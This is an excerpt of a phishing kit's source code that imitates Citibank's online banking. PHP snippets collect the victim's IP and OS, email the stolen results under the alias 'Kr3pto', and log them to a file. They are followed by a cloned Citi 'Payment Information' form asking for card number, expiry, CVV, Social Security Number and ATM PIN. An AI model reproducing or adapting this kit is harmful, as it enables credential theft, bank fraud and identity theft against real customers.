...
$VictimInfo .= "| OS : $os";
$headers = "From:Kr3pto <Kr3ptoCITI@results.co.uk>";
$subj = "CITI Login [$ip]";
...
if($saveonhost == 1){
$fp = fopen('l0gz/CITI_loginz_.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
}else{
...
<html class="cbolui-ddl" style="display: block; visibility: visible;" lang="en">
    <head>
		...
		<script src="si_assetz/js/payment.js"></script>
        <script>
                                        ...
                                        <app-set-up-online-access _nghost-ytb-c286="" class="ng-tns-c212-0 ng-star-inserted">
                                            <citi-simple-layout _ngcontent-ytb-c286="" role="main" brandingtype="preLoginVanilla">
                                                ...
                                                <citi-form-container _ngcontent-ytb-c286="" formheader="" formaction="" class="set-up-online-overflow ng-star-inserted">
                                                    <form name="undefined" action="Personal.php?sessionid=<?php echo generateRandomString(130); ?>&sslchannel=true" method="POST">
                                                        <div>
                                                                ...
                                                                <section _ngcontent-ytb-c286="" class="parentDiv">
                                                                    <section _ngcontent-ytb-c286="">
                                                                        <citi-text-header _ngcontent-ytb-c286="" level="1" class="HelpHeader" _nghost-ytb-c54="">
                                                                            ...
                                                                            <h1 _ngcontent-ytb-c54="" class="HelpHeader header-level-2 ng-star-inserted">Payment Information</h1>
                                                                        </citi-text-header>
                                                                    </section>
                                                                    <section _ngcontent-ytb-c286="">
                                                                                ...
                                                                                <div _ngcontent-ytb-c100="" class="row">
																					...
																					<section>
                                                                                        <div class="form-group">
																							<label for="ccname" class="hiddenclass" style="opacity: 0;">Name as it appears on card</label>
                                                                                            <div>
																								<input placeholder="Name as it appears on card" type="text" name="ccname" id="ccname" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Name as it appears on card.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="ccnum" class="hiddenclass" style="opacity: 0;">Card number</label>
                                                                                            <div>
																								<input placeholder="Card number" type="tel" name="ccnum" id="ccnum" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Card number.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="ccexp" class="hiddenclass" style="opacity: 0;">Card expiry date</label>
                                                                                            <div>
																								<input placeholder="Card expiry date" type="tel" name="ccexp" id="ccexp" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Card expiry date.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="cccvv" class="hiddenclass" style="opacity: 0;">Card security code</label>
                                                                                            <div>
																								<input placeholder="Card security code" type="tel" name="cccvv" id="cccvv" maxlength="4" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Card security code.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="ssn" class="hiddenclass" style="opacity: 0;">Social Security Number</label>
                                                                                            <div>
																								<input placeholder="Social Security Number" type="tel" name="ssn" id="ssn" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Social Security Number.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="atmpin" class="hiddenclass" style="opacity: 0;">ATM PIN</label>
                                                                                            <div>
																								<input placeholder="ATM PIN" type="tel" name="atmpin" id="atmpin" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your ATM PIN.</span></div>
                                                                                        </div>
                                                                                    </section>
